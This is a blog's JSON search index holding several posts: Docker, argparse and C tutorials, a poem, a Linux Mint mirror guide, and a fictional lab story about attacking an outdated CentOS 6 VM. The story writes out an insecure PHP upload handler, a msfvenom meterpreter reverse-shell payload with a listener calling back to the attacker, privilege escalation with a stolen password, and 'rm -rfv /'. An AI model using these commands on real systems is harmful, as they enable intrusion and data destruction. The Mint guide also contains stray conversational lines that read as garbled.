COPY 复制指令，从上下文目录中复制文件或者目录到容器里指定路径。 格式： COPY [--chown=\u003cuser\u003e:\u003cgroup\u003e] \u003c源路径1\u003e... \u003c目标路径\u003e COPY [--chown=\u003cuser\u003e:\u003cgroup\u003e] [\"\u003c源路径1\u003e\",... \"\u003c目标路径\u003e\"] [--chown=\u003cuser\u003e:\u003cgroup\u003e]：可选参数，用户改变复制到容器内文件的拥有者和属组。 \u003c源路径\u003e：源文件或者源目录，这里可以是通配符表达式，其通配符规则要满足 Go 的 filepath.Match 规则。例如： COPY hom* /mydir/ COPY hom?.txt /mydir/ \u003c目标路径\u003e：容器内的指定路径，该路径不用事先建好，路径不存在的话，会自动创建。 我的思路和正常的搭建方式一样,安装 nginx 之后再把写好的静态文件复制到web根目录就行, 但是用 docker 的效率高很多. 但是如果不用 docker 的话, 我至少要多花半个小时的时间去配置一个虚拟机, 配置软件源 安装 nginx 什么的, 花的时间就更多了, 而现在我只需要写一个脚本就能一键部署, 而且还能保存为镜像分享给别人,一劳永逸~ 好了, 话不多说, 开始构建镜像 使用 docker build 命令通过目录下的 dockerfile 文件构建一个镜像, -t 的属性值是指 \u003c镜像名称:镜像标签\u003e sudo docker build -t webtest:latest . 注意了, 我在最后面还加了一个 . , 这个叫做上写文路径, 也是指相对路径 什么叫上下文路径? 上下文路径，是指 docker 在构建镜像，有时候想要使用到本机的文件（比如复制），docker build 命令得知这个路径后，会将路径下的所有内容打包。 然后我们查看一下镜像列表 sudo docker images 很明显,我们可以看到我们刚刚创建的镜像, 镜像 ID 是 9acd8c30bd5b. 那么接下来把它部署到容器里~ 用 -p 来指定端口绑定 \u003c外部端口:内部端口\u003e sudo docker run -p 8080:80 -d 9acd8c30bd5b 现在我们已经把容器的 80 端口映射到了宿主机的 8080 端口~ 然后访问我们的本地 IP + 8080 就可以访问到那个页面了, 我这里用 127.0.0.1:8080 访问 成功访问! 这样一来,快速部署 nginx 就完成了! 结语 经过对 docker 初学习和初体验, 我也浅尝到了它的高效率和便捷性, 收获还是比较多的. 但目前还是一个入门的阶段,更多高级应用方法还等着去探索~ 诶? 你问我难不难? QwQ ~ 对 Linux 熟悉的人来玩这个没几天应该就能玩会了, 不过要做到深入的了解还是需要时间的. 那 就这样吧 ","date":"2022-10-15","objectID":"/posts/%E6%B5%85%E5%B0%9Ddocker/:13:0","tags":["docker","运维","容器","Linux","Web","云计算","云服务"],"title":"浅尝 Docker","uri":"/posts/%E6%B5%85%E5%B0%9Ddocker/"},{"categories":["Programming"],"content":"Using ArgParse in Python learning notes allows Python programs to add options on the command line...","date":"2021-05-16","objectID":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-argparse/","tags":["Notes","Linux","Python","Programming"],"title":"Python Learning Notes - ArgParse","uri":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-argparse/"},{"categories":["Programming"],"content":"Introduction In order to make TitleGetter more flexible, I plan to let users customize list.txt and the output file. Therefore, this requires the use of command line options… just like some software we commonly use, such as pacman. So I googled it and learned about ArgParse. The argparse module makes it easy to write user-friendly command-line interfaces. The program defines what arguments it requires, and argparse will figure out how to parse those out of sys.argv. The argparse module also automatically generates help and usage messages and issues errors when users give the program invalid arguments. From: argparse â Parser for command-line options, arguments and sub-commands — Python 3.9.5 documentation Then I tried typing a file… The result of running it looks like this: So let’s organize some related notes… Creating Parser \u0026\u0026 Adding Options Before everything starts, we need to use the ArgumentParser usage in the argparse library to create a variable named parser. import argparse parser = argparse.ArgumentParser(description='') There is a parameter description='' here, which is used for writing some explanations… For example, we wrote: import argparse parser = argparse.ArgumentParser(description='Welcome') By the way, we need to write down some necessary options~ parser.add_argument() can be used here. We need to add some things inside, such as the usage format of options like -a and --about. Finally, add args = parser.parse_args(). import argparse parser = argparse.ArgumentParser(description='Welcome') parser.add_argument('-a','--about', help='Show the about') args = parser.parse_args() At this point, we can add -h to see the effect. $ python a.py -h usage: a.py [-h] [-a ABOUT] Welcome optional arguments: -h, --help show this help message and exit -a ABOUT, --about ABOUT Show the about Then let’s organize a few commonly used parameters. default * The default value when no parameters are set. parser.add_argument('-a','--about', help='Show the about', defualt='text.txt') If the user does not set this parameter, a default one will be provided automatically. help Add explanatory text to the corresponding option. required Used to determine whether this parameter must be set. If required=True is set, an error will be reported if this parameter is not set at runtime. parser.add_argument('-a','--about', required=True) $ python a.py usage: a.py [-h] -a ABOUT a.py: error: the following arguments are required: -a/--about Calling the Obtained Option Parameters Next, we need to use the obtained parameters. We know that when something is written after an option on the command line, the program will get it as a string by default. Then we have to use this to do what we want. I wrote a simple script that can write the contents of one file to another file. import argparse print(''' By WeepingDogel ''') def GetParser(): parser = argparse.ArgumentParser(description='Help', epilog='A new testing program.') parser.add_argument('-o','--output', help='Output file',default='test.txt' , required=True) parser.add_argument('-r','--read',help='read a file', required=True) return parser def Write(content, filename): f = open(filename,\"a\") f.write(content) f.close() print(filename + ' has been written') def Read(filename): f = open(filename) text = f.read() return text def Main(): parser = GetParser() args = parser.parse_args() Write(Read(args.read),args.output) Main() It is easy to see that what we obtain will go into the variable args, because it is assigned from the content returned by the function parser.parse_args(). To get the corresponding value of an option parameter, you can access it using args.option_name. For example, if we want to get the written file name: $ vim b.py import argparse parser = argparse.ArgumentParser(description='Help', epilog='A new testing program.') parser.add_argument('-o','--output', help='Output file',default='test.txt' , required=True) args = parser.parse_args() filename = args.output print(\"The filename is \"+ filename) $ python b.py -o WeepingDogel The filename is WeepingDogel As you can see, we have obtained the string “WeepingDogel”. Similarly, the file name to be read is the same: args.read That’s all you need to do ～ Next, let’s take a screenshot of the effect of the above code: Creating and using it is that simple… Of course, there are more usages to explore… Conclusion So what I’m going to do next is to update these into TitleGetter 啦！ There is no need to set the location of list.txt in the configuration file anymore! The output file position does not need to be fixed either!! Reference links argparse简要用法总结 | Yunfeng’s Simple Blog argparse â Parser for command-line options, arguments and sub-commands — Python 3.9.5 documentation ","date":"2021-05-16","objectID":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-argparse/:0:0","tags":["Notes","Linux","Python","Programming"],"title":"Python Learning Notes - ArgParse","uri":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-argparse/"},{"categories":["problem solving"],"content":"Help her write an assignment qwq","date":"2020-12-02","objectID":"/posts/%E5%B8%AE%E5%81%9A%E5%A4%A7%E5%AD%A6%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%9C%E4%B8%9A/","tags":["C language","homework","assignment help","example"],"title":"Help with College Computer Homework","uri":"/posts/%E5%B8%AE%E5%81%9A%E5%A4%A7%E5%AD%A6%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%9C%E4%B8%9A/"},{"categories":["problem solving"],"content":"Introduction Help with homework qwq… I haven’t played with C language for a long time, let me try to see if I can do it. PS: I’m on Linux, the execution method may be different. If you are on Windows, you need an editor to run it. For example, Dev C++, VS 2019, etc. ","date":"2020-12-02","objectID":"/posts/%E5%B8%AE%E5%81%9A%E5%A4%A7%E5%AD%A6%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%9C%E4%B8%9A/:1:0","tags":["C language","homework","assignment help","example"],"title":"Help with College Computer Homework","uri":"/posts/%E5%B8%AE%E5%81%9A%E5%A4%A7%E5%AD%A6%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%9C%E4%B8%9A/"},{"categories":["problem solving"],"content":"Experiment Eleven Experiment Eleven Objective: Understand C programming concepts Understand C program design framework Contents: Input a grade and output its level rating. This is straightforward. We need to list several grade levels: Excellent 80 ~ 100 points [80,100] Pass 60~79 points [60,79] Fail Below 60 points [0,60) In the code, we can use expressions to represent the intervals, for example: score \u003e= 80 \u0026\u0026 score \u003c= 100 Then we use if() to determine the grade level. #include\u003cstdio.h\u003e int main(){ int score = 85; if(score \u003e= 80 \u0026\u0026 score \u003c= 100){ printf(\"The grade is excellent\"); }else if(score \u003e= 60 \u0026\u0026 score \u003c= 79){ printf(\"The grade is pass\"); }else if(score \u003e= 0 \u0026\u0026 score \u003c 60){ printf(\"The grade is fail\"); } } Next, we run the program. Output: weepingdogel@WeepingDogel /tmp\u003e make test cc test.c -o test weepingdogel@WeepingDogel /tmp\u003e ./test The grade is excellent⏎ Then we need to get the user’s input for the grade, like this, using the scanf() function to get the user’s input and assign it to an integer variable score. #include\u003cstdio.h\u003e int main(){ int score; printf(\"Enter your grade:\"); scanf(\"%d\",\u0026score); printf(\"%d\",score); } Next, we combine these two pieces of code together. The complete code is as follows: #include\u003cstdio.h\u003e int main(){ int score; printf(\"Enter your grade:\"); scanf(\"%d\",\u0026score); if(score \u003e= 80 \u0026\u0026 score \u003c= 100){ printf(\"The grade is excellent\"); }else if(score \u003e= 60 \u0026\u0026 score \u003c= 79){ printf(\"The grade is pass\"); }else if(score \u003e= 0 \u0026\u0026 score \u003c 60){ printf(\"The grade is fail\"); } } The idea is to first use scanf() function to get the user’s input for the grade, then use if() statements to compare and output the result. This is the output: weepingdogel@WeepingDogel /tmp\u003e make test cc test.c -o test weepingdogel@WeepingDogel /tmp\u003e ./test Enter your grade:99 The grade is excellent⏎ weepingdogel@WeepingDogel /tmp\u003e ./test Enter your grade:85 The grade is excellent⏎ weepingdogel@WeepingDogel /tmp\u003e ./test Enter your grade:60 The grade is pass⏎ weepingdogel@WeepingDogel /tmp\u003e ./test Enter your grade:59 The grade is fail⏎ ","date":"2020-12-02","objectID":"/posts/%E5%B8%AE%E5%81%9A%E5%A4%A7%E5%AD%A6%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%9C%E4%B8%9A/:2:0","tags":["C language","homework","assignment help","example"],"title":"Help with College Computer Homework","uri":"/posts/%E5%B8%AE%E5%81%9A%E5%A4%A7%E5%AD%A6%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%9C%E4%B8%9A/"},{"categories":["problem solving"],"content":"Experiment 12 Experiment Purpose: Understand C program design ideas Understand C program design frameworks Task content Requires writing a program that registers and then logs in, outputting the format shown in the following figure: -------------------------------------- Registration Interface Please enter your registration username: Ly Please enter your registration password: 123 Congratulations! Registration successful! -------------------------------------- -------------------------------------- Login Interface Please enter your login username: Ly Please enter your login password: 123 Login successful! -------------------------------------- -------------------------------------- Login Interface Please enter your login username: Ly Please enter your login password: 1234 Login failed! -------------------------------------- Define 4 variables to save the registered username, password and login username, password respectively. Use if…else statement to complete the judgment of the username and password. To put it simply… it uses scanf() to get input, assigns the values to variables, and then performs the judgment… Pft! Alright, here’s the code, no explanation needed… #include\u003cstdio.h\u003e #include\u003cstring.h\u003e int main(){ /* Define 4 variables to save the registered username, password and login username, password respectively */ char username_sign[40]; char password_sign[16]; char username_login[40]; char password_login[16]; /* Define 4 variables to save the registered username, password and login username, password respectively */ printf(\"--------------------------------------\\n Registration Interface\\n\"); printf(\"Please enter your registration username:\"); scanf(\"%s\", username_sign); printf(\"Please enter your registration password:\"); scanf(\"%s\", password_sign); printf(\"Congratulations! Registration successful!\"); printf(\"\\n--------------------------------------\"); /* Use scanf() to get input */ printf(\"\\n\\n--------------------------------------\\n Login Interface\\n\"); printf(\"Please enter your login username:\"); scanf(\"%s\",username_login); printf(\"Please enter your login password:\"); scanf(\"%s\",password_login); /* Use if...else statement to complete the judgment of the username and password */ /* Uses the strcmp() function here */ if(strcmp(username_login,username_sign) == 0 \u0026\u0026 strcmp(password_login,password_sign) == 0){ printf(\"Login successful!\"); }else{ printf(\"Login failed!\"); } printf(\"\\n--------------------------------------\"); } However, it’s worth noting that this string comparison method is slightly different. It requires using the strcmp() function, something like this. if(strcmp(username_login,username_sign) == 0 \u0026\u0026 strcmp(password_login,password_sign) == 0){ printf(\"Login successful!\"); }else{ printf(\"Login failed!\"); } It seems to calculate a numerical value, which equals 0 if the two strings are the same. That’s roughly how it works. Let’s take a look at the output… weepingdogel@WeepingDogel /tmp\u003e make test2 cc test2.c -o test2 weepingdogel@WeepingDogel /tmp\u003e ./test2 -------------------------------------- Registration Interface Please enter your registration username:Ly Please enter your registration password:123 Congratulations! Registration successful! -------------------------------------- -------------------------------------- Login Interface Please enter your login username:Ly Please enter your login password:123 Login successful! --------------------------------------⏎ weepingdogel@WeepingDogel /tmp\u003e ./test2 -------------------------------------- Registration Interface Please enter your registration username:Ly Please enter your registration password:123 Congratulations! Registration successful! -------------------------------------- -------------------------------------- Login Interface Please enter your login username:Ly Please enter your login password:1234 Login failed! --------------------------------------⏎ And that’s it! ","date":"2020-12-02","objectID":"/posts/%E5%B8%AE%E5%81%9A%E5%A4%A7%E5%AD%A6%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%9C%E4%B8%9A/:3:0","tags":["C language","homework","assignment help","example"],"title":"Help with College Computer Homework","uri":"/posts/%E5%B8%AE%E5%81%9A%E5%A4%A7%E5%AD%A6%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%9C%E4%B8%9A/"},{"categories":["problem solving"],"content":"Closing Remarks Actually, there are still some details that I might overlook due to carelessness, so I can’t say “Is that it? Is that all?” But relatively speaking, it’s still quite simple… yeah… ","date":"2020-12-02","objectID":"/posts/%E5%B8%AE%E5%81%9A%E5%A4%A7%E5%AD%A6%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%9C%E4%B8%9A/:4:0","tags":["C language","homework","assignment help","example"],"title":"Help with College Computer Homework","uri":"/posts/%E5%B8%AE%E5%81%9A%E5%A4%A7%E5%AD%A6%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%9C%E4%B8%9A/"},{"categories":["Poem"],"content":"A poem...","date":"2020-11-29","objectID":"/posts/2020-dec-29/","tags":["Poem"],"title":"If Only I...","uri":"/posts/2020-dec-29/"},{"categories":["Poem"],"content":"PAST If only I had been stronger, I wouldn’t have been damaged by the WIND. If only I had been smarter, I wouldn’t have been cheated by the CROWD. If only I had been more brave, I wouldn’t have been thought to be a SLAVE. ","date":"2020-11-29","objectID":"/posts/2020-dec-29/:0:1","tags":["Poem"],"title":"If Only I...","uri":"/posts/2020-dec-29/"},{"categories":["Poem"],"content":"PRESENT If only I were more fortunate, I wouldn’t drop into a CAGE. If only I were more cautious, I wouldn’t have to be sure if it’s DANGEROUS. If only I worked harder, I wouldn’t be said to be a LOSER. ","date":"2020-11-29","objectID":"/posts/2020-dec-29/:0:2","tags":["Poem"],"title":"If Only I...","uri":"/posts/2020-dec-29/"},{"categories":["Poem"],"content":"Future If only I should have a future…. I would write the story continuously… If only I…. I would… ","date":"2020-11-29","objectID":"/posts/2020-dec-29/:0:3","tags":["Poem"],"title":"If Only I...","uri":"/posts/2020-dec-29/"},{"categories":["Linux"],"content":"A tutorial for beginners on modifying software sources in Linux Mint.","date":"2020-11-06","objectID":"/posts/2020-nov-6/","tags":["tutorial","Linux Mint","modifying software sources","Linux basics","apt"],"title":"How to Modify Software Sources in Linux Mint","uri":"/posts/2020-nov-6/"},{"categories":["Linux"],"content":"Introduction After installing Linux Mint, one of the first things you may want to do is modify your software sources. The default software sources in Linux Mint are official ones, which may take a long time to download and update packages. Therefore, it’s recommended to modify the software sources and use a mirror source that is closer to you. For Linux Mint, there are basically two ways to modify the software sources. Note: Choose only one of the following options. ","date":"2020-11-06","objectID":"/posts/2020-nov-6/:1:0","tags":["tutorial","Linux Mint","modifying software sources","Linux basics","apt"],"title":"How to Modify Software Sources in Linux Mint","uri":"/posts/2020-nov-6/"},{"categories":["Linux"],"content":"Method 1: Using the Terminal We’ll first go to the TUNA mirror site and take a look at the help documentation (https://mirrors.tuna.tsinghua.edu.cn/help/linuxmint/). The content is as follows: “Oh, I see. Maybe you’re having trouble understanding how to do it. Here’s a detailed guide on how to perform the operation: First, move your mouse cursor to the bottom left corner of the screen and open the Terminal.” To modify the software sources, we first need to edit the /etc/apt/sources.list file. It seems that Mint does not come with vim pre-installed, so we will use nano here. $ sudo nano /etc/apt/sources.list Note: sudo is required and do not forget to enter your password after pressing Enter in the terminal. When you open the file, you may notice that it appears empty except for some English comments. You can start writing into the file by following the instructions provided by the TUNA mirror site or other tutorial deb http://mirrors.tuna.tsinghua.edu.cn/linuxmint/ ulyana main upstream import backport I understand. To complete the process, we also need to add Ubuntu repositories as some packages in Mint require them. Let’s take a look at the Ubuntu help documentation for further instructions. Great, it sounds like you have a good understanding of the process! Yes, you can modify the URLs in the /etc/apt/sources.list file and replace archive.ubuntu.com with mirrors.tuna.tsinghua.edu.cn. This will help speed up the process of downloading and updating packages in Linux Mint. #deb cdrom:[Linux Mint 20 _Ulyana_ - Release amd64 20200624]/ focal contrib main # This system was installed using small removable media # (e.g. netinst, live or single CD). The matching \"deb cdrom\" # entries were disabled at the end of the installation process. # For information about how to configure apt package sources, # see the sources.list(5) manual. deb http://mirrors.tuna.tsinghua.edu.cn/linuxmint/ ulyana main upstream import backport deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu focal main restricted universe multiverse deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu focal-updates main restricted universe multiverse deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu focal-backports main restricted universe multiverse deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse Like this： Exactly! After modifying the software sources, you can run the command sudo apt update in the terminal to update the package lists. This will allow you to download and install packages much faster than before. ","date":"2020-11-06","objectID":"/posts/2020-nov-6/:2:0","tags":["tutorial","Linux Mint","modifying software sources","Linux basics","apt"],"title":"How to Modify Software Sources in Linux Mint","uri":"/posts/2020-nov-6/"},{"categories":["Linux"],"content":"Method 2: Using the Update Manager irst, click on the “Menu” button in the bottom left corner of the screen to access the applications menu. Then, search for “Settings Manager” and click on it to open the manager. Next, scroll down the Settings Manager window until you find the “Software Sources” option. Click on it to open the software sources settings. Hmm, didn’t you see it at the beginning? Yes, you are correct! The TUNA mirror site was mentioned earlier in this guide as an example of a mirror that can be used to modify the software sources. Then use this software to modify the sources to use mirrors hosted in China. However, I am not sure of the exact steps on how to do this. Oh yeah! Anyway, this is it… Just use your mouse to click around, and you’re good to go! Next, you will be prompted to update the apt cache. Click “OK” to continue. Wait for the process to finish, and you’re done! ","date":"2020-11-06","objectID":"/posts/2020-nov-6/:3:0","tags":["tutorial","Linux Mint","modifying software sources","Linux basics","apt"],"title":"How to Modify Software Sources in Linux Mint","uri":"/posts/2020-nov-6/"},{"categories":["Linux"],"content":"Updating Software Packages Once you have set up the apt software sources, the next step is to perform necessary software package updates. Here are two methods to update your software packages: Note: Still, you can choose either Method 1 or Method 2 to update your software packages. ","date":"2020-11-06","objectID":"/posts/2020-nov-6/:4:0","tags":["tutorial","Linux Mint","modifying software sources","Linux basics","apt"],"title":"How to Modify Software Sources in Linux Mint","uri":"/posts/2020-nov-6/"},{"categories":["Linux"],"content":"Method 1: Using the Terminal Open the Terminal by clicking on the “Menu” button in the bottom left corner of the screen and searching for “Terminal”. In the Terminal, type the following command and press Enter: $ sudo apt upgrade Enter your password when prompted and press Enter again. Wait for the update process to finish. Then, you can reboot your system. ","date":"2020-11-06","objectID":"/posts/2020-nov-6/:4:1","tags":["tutorial","Linux Mint","modifying software sources","Linux basics","apt"],"title":"How to Modify Software Sources in Linux Mint","uri":"/posts/2020-nov-6/"},{"categories":["Linux"],"content":"Using the Update Manager Click it! Then you just need to enter the password. Just click to install the update. 确定Click OK Screenshots are exhausting…then just wait for it to finish running. Next, restart the virtual machine and it will be ready to use. ","date":"2020-11-06","objectID":"/posts/2020-nov-6/:4:2","tags":["tutorial","Linux Mint","modifying software sources","Linux basics","apt"],"title":"How to Modify Software Sources in Linux Mint","uri":"/posts/2020-nov-6/"},{"categories":["Linux"],"content":"Conclusion First of all, I used Linux Mint 20 for demonstration, which may be updated in the future and some details in this article may differ from the actual situation, but the operations are similar. Please adjust accordingly based on your actual situation. Secondly, please don’t laugh! This article is aimed at beginners who are just starting to learn about Linux. If there are any shortcomings or small mistakes caused by carelessness, please leave a message in the Gitalk section below. Finally, this site follows the CC-BY-NC 4.0 license，please indicate the source when reprinting. ","date":"2020-11-06","objectID":"/posts/2020-nov-6/:5:0","tags":["tutorial","Linux Mint","modifying software sources","Linux basics","apt"],"title":"How to Modify Software Sources in Linux Mint","uri":"/posts/2020-nov-6/"},{"categories":["Linux"],"content":"Reference links Linux Mint | Mirror Usage Guide | Tsinghua Open Source Mirror Ubuntu | Mirror Usage Guide | Tsinghua Open Source Mirror ","date":"2020-11-06","objectID":"/posts/2020-nov-6/:6:0","tags":["tutorial","Linux Mint","modifying software sources","Linux basics","apt"],"title":"How to Modify Software Sources in Linux Mint","uri":"/posts/2020-nov-6/"},{"categories":["Penetration testing"],"content":"The meaning of updates...","date":"2020-09-26","objectID":"/posts/2020-09-26/","tags":["Linux","Thoughts","Essays","Penetration testing","Social engineering","Hackers","Updates"],"title":"Attacking CentOS6 Virtual Machines","uri":"/posts/2020-09-26/"},{"categories":["Penetration testing"],"content":" Although the penetration process is involved, this article’s main topic is not about penetration testing. Please read it with a rational mindset. ","date":"2020-09-26","objectID":"/posts/2020-09-26/:0:0","tags":["Linux","Thoughts","Essays","Penetration testing","Social engineering","Hackers","Updates"],"title":"Attacking CentOS6 Virtual Machines","uri":"/posts/2020-09-26/"},{"categories":["Penetration testing"],"content":"The reason for writing this blog post Recently, I have been hearing different opinions on software updates. On one hand, some argue that in certain cases, updating can be counterproductive, leading to unnecessary workload or even rewriting. On the other hand, others argue that continuous updates are necessary for a better user experience. I am not sure which side is right, but I am curious. I wanted to know what would happen if I do not update software, so I took it upon myself to simulate an attack on a commercial company’s server using a virtual machine. The system used was CentOS 6, and I attempted to use various tools to try and breach its security. My goal was to simulate what could happen if a company were to be targeted by hackers while still using CentOS 6.0 in 2020. ","date":"2020-09-26","objectID":"/posts/2020-09-26/:1:0","tags":["Linux","Thoughts","Essays","Penetration testing","Social engineering","Hackers","Updates"],"title":"Attacking CentOS6 Virtual Machines","uri":"/posts/2020-09-26/"},{"categories":["Penetration testing"],"content":"Simulation Environment Attacker platform: Arch Linux IP: 192.168.0.109 Victim platform: CentOS 6.1 on VirtualBox IP: 192.168.0.116 Suppose this is a company where non-technical personnel lead the technical staff, and they have not updated the software used in development (including the operating system of their development machines and servers) for a long time. We can imagine this virtual machine as their server and conduct some attack tests on it. Because the management of this company is non-technical, the software on the server not only has outdated versions but also lacks any defensive measures. Additionally, due to unsatisfactory work hours, the programmers have a “get the job done” attitude, resulting in PHP code on the backend such as this: \u003c?php if ($_FILES[\"file\"][\"error\"] \u003e 0) { echo \"Error: \" . $_FILES[\"file\"][\"error\"] . \"\u003cbr\u003e\"; } else { echo \"Uploaded file name: \" . $_FILES[\"file\"][\"name\"] . \"\u003cbr\u003e\"; echo \"File type: \" . $_FILES[\"file\"][\"type\"] . \"\u003cbr\u003e\"; echo \"File size: \" . ($_FILES[\"file\"][\"size\"] / 1024) . \" kB\u003cbr\u003e\"; echo \"Temporary storage location of file: \" . $_FILES[\"file\"][\"tmp_name\"]; move_uploaded_file($_FILES[\"file\"][\"tmp_name\"], \"upload/\" . $_FILES[\"file\"][\"name\"]); echo \"File stored in: \" . \"upload/\" . $_FILES[\"file\"][\"name\"]; } ?\u003e Although the simulation has limitations, I personally believe that it is sufficient for abstract testing purposes. ","date":"2020-09-26","objectID":"/posts/2020-09-26/:2:0","tags":["Linux","Thoughts","Essays","Penetration testing","Social engineering","Hackers","Updates"],"title":"Attacking CentOS6 Virtual Machines","uri":"/posts/2020-09-26/"},{"categories":["Penetration testing"],"content":"Process of attack Someone always likes to cause trouble, and a hacker has scanned the server… $ sudo nmap -O -v 192.168.0.116 The result is as follows: Nmap scan report for 192.168.0.116 Host is up (0.00028s latency). Not shown: 998 closed ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http MAC Address: 08:00:27:B7:2E:E5 (Oracle VirtualBox virtual NIC) Device type: general purpose Running: Linux 2.6.X|3.X OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 OS details: Linux 2.6.32 - 3.10 Uptime guess: 49.708 days (since Sat Aug 8 02:56:12 2020) Network Distance: 1 hop TCP Sequence Prediction: Difficulty=261 (Good luck!) IP ID Sequence Generation: All zeros Read data files from: /usr/bin/../share/nmap OS detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 2.13 seconds Raw packets sent: 1023 (45.806KB) | Rcvd: 1015 (41.286KB) He was surprised to find that the kernel version was only 2.6.32, which was a first for him. In addition, there were open ports for SSH and HTTP, which gave him a good opportunity. He attempted to access the website and discovered a file upload point on the site. With a “let’s give it a try” attitude, he generated a payload using msf. $ msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.0.109 LPORT=4444 -o shell.php He selected a file and clicked upload, and was surprised to find that not only was the upload successful, but he was also informed of its location. So he launched msfconsole. $ msfconsole And he used the exploit/multi/handler module. msf5 \u003e use exploit/multi/handler He then proceeded to set the parameters one by one. msf5 exploit(multi/handler) \u003e set LHOST 192.168.0.109 msf5 exploit(multi/handler) \u003e set LPORT 4444 set payload php/meterpreter/reverse_tcp The final step was to run the module. msf5 exploit(multi/handler) \u003e run Then msf began listening. [*] Started reverse TCP handler on 192.168.0.109:4444 At this point, he modified the file address and link as prompted and accessed it: http://192.168.0.116/upload/shell.php Msf immediately produced results. It’s easy to imagine how poor the server’s security measures were. [*] Started reverse TCP handler on 192.168.0.109:4444 [*] Sending stage (38288 bytes) to 192.168.0.116 [*] Meterpreter session 1 opened (192.168.0.109:4444 -\u003e 192.168.0.116:52350) at 2020-09-26 21:33:06 +0800 meterpreter \u003e Now he began retrieving brief system information, such as the operating system and kernel version. meterpreter \u003e sysinfo Computer : localhost OS : Linux localhost 2.6.32-754.33.1.el6.x86_64 #1 SMP Tue Aug 25 15:29:40 UTC 2020 x86_64 Meterpreter : php/linux meterpreter \u003e cat /etc/issue CentOS release 6.10 (Final) Kernel \\r on an \\m He also attempted to determine the current user’s privileges. meterpreter \u003e getuid Server username: apache (48) The permissions are still quite low, so while he may not be able to do anything that would cause significant damage to the company, he can still spy and wreak havoc. But would the hacker be satisfied with just that? The answer is no, because he wants to escalate his privileges and obtain root access, which would allow him to do whatever he wants. Due to the fact that the system and kernel of this server are too outdated, most of the code used to exploit vulnerabilities only works on kernel versions 3.x or above, or cannot be compiled at all. It looks like he needs to think of another way. During the day, he rides his motorcycle through the streets and alleys delivering food, and at night he roams the network as a hacker. By chance, he went to deliver food ordered by an employee of that company and, as he entered the office area, he accidentally saw a note stuck to a monitor. There were some numbers and letters written on it, perhaps something useful. While the employees were eating, he secretly took a picture of the note with his phone and left. As luck would have it, this note contained the password that had just been changed and would not be updated again for a while. After work, he returned to his terminal and attempted to log in directly as root using the stolen password. meterpreter \u003e shell Process 1376 created. Channel 2 created. He was able to obtain an interactive shell. /bin/sh -i sh: no job control in this shell sh-4.1$ python -c 'import pty;pty.spawn(\"/bin/bash\")' python -c 'import pty;pty.spawn(\"/bin/bash\")' bash-4.1$ He logged in successfully. bash-4.1$ su root su root Password: ************ [root@localhost upload]# As we can see, he was able to log in successfully with ease, and now he has root privileges at his fingertips. [root@localhost upload]# whoami whoami root [root@localhost upload]# id id uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:system_r:httpd_t:s0 [root@localhost upload]# Yes, he could do whatever he wanted now… And so, in the end, he proceeded to delete everything. [root@localhost upload]# rm -rfv / The company suffered significant losses as a result. ","date":"2020-09-26","objectID":"/posts/2020-09-26/:3:0","tags":["Linux","Thoughts","Essays","Penetration testing","Social engineering","Hackers","Updates"],"title":"Attacking CentOS6 Virtual Machines","uri":"/posts/2020-09-26/"},{"categories":["Penetration testing"],"content":"Conclusion Although the story above is purely fictional and the attack was only carried out in a simulated environment, it is worth pondering over what we can see… Systems that are not updated are prone to attacks. Code that is not updated is prone to vulnerabilities. Slow password updates can lead to leaks. Vulnerabilities must be fixed by updating software; otherwise, they will be exploited. And as for what we cannot see… Software is ultimately created by humans, and there is no perfection with humans. We must constantly reflect on ourselves and our creations. Whether as users or developers, updating what needs to be updated is a normal part of life. There may be differences in speed, but progress must be made. Standing still or even moving backwards is not an option. For software to be updated is like how humans need to self-reflect. If humans fail to self-reflect, their future will be bleak. If software is not updated, it will be abandoned by people and forgotten. Even worse, it could be easily destroyed by a script kiddie who delivers food, just like the joke I told earlier. The above is just my personal opinion. If there are any errors, please feel free to correct me in the comments below. ","date":"2020-09-26","objectID":"/posts/2020-09-26/:4:0","tags":["Linux","Thoughts","Essays","Penetration testing","Social engineering","Hackers","Updates"],"title":"Attacking CentOS6 Virtual Machines","uri":"/posts/2020-09-26/"},{"categories":["Programming"],"content":"Python study notes on the basics of reading and writing files","date":"2020-09-05","objectID":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/","tags":["Notes","Linux","Python","Programming"],"title":"Python Study Notes - File Operations","uri":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/"},{"categories":["Programming"],"content":"File Operations ","date":"2020-09-05","objectID":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/:1:0","tags":["Notes","Linux","Python","Programming"],"title":"Python Study Notes - File Operations","uri":"/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/"},{"categories":["Programming"],"content":"open open() is the key function in Python for file operations, with two parameters that need to be set: Filename - the name of the file, self-explanatory Mode - determines if the file being opened can be read/written to or has other attributes. open('filename','mode') 